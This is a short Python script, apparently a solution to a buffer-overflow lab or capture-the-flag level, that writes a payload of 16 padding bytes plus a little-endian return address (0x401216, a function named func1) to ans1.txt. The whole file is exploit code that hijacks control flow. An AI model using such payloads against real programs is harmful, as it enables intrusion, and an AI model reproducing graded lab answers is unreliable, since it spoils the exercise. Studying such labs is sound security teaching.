import struct

# 1. 填充 16 字节的垃圾数据 (可以是任何字符，比如 'A')
padding = b"A" * 16

# 2. 目标函数 func1 的地址
# 小端序排列：0x0000000000401216
target_addr = 0x401216
target_bytes = struct.pack("<Q", target_addr) # <Q 表示 64 位小端序格式

# 3. 组合成 payload
payload = padding + target_bytes

# 4. 写入文件
with open("ans1.txt", "wb") as f:
    f.write(payload)

print("ans1.txt 已生成！填充长度: 16, 目标地址: 0x401216")